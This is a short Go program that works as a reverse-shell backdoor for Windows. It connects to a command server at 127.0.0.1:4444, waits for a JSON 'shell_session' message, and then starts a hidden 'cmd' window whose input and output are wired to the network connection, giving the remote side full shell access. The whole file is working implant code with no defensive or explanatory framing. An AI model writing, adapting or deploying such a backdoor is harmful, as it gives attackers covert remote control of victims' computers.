package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"syscall"
	"time"
)

type Msg struct {
	cmd  string
	args []string
}

func interpreter(buf []byte, conn net.Conn) {

	var dat map[string]interface{}

	if err := json.Unmarshal(buf, &dat); err != nil {
		panic(err)
	}
	msg_type := dat["type"].(string)
	switch msg_type {
	case "shell_session":
		fmt.Println("STARTING SHELL SESSION")
		beginShellSession(conn)
	}
}

func parser(message string, conn net.Conn) {

	byt := []byte(message)
	var dat map[string]interface{}

	if err := json.Unmarshal(byt, &dat); err != nil {
		panic(err)
	}
	msg_type := dat["type"].(string)
	switch msg_type {
	case "shell_session":
		beginShellSession(conn)

	}
}
func main() {
	buf := make([]byte, 1024)

	for {
		connection, err := net.Dial("tcp", "127.0.0.1:4444")
		if err != nil {
			time.Sleep(10 * time.Second)
			panic(err)
			continue
		} else {
			defer connection.Close()

		}
		blen, err := connection.Read(buf)
		if err != nil {
			panic(err)
		}
		//rcvd_cmd := string(buf[:blen])
		//fmt.Println("[+] Received " + rcvd_cmd + " from server !")
		interpreter(buf[:blen], connection)
		//beginShellSession(connection)
	}
}

func beginShellSession(conn net.Conn) {

	cmd := exec.Command("cmd")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Redirect the command's standard input, output, and error to the established connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()

}
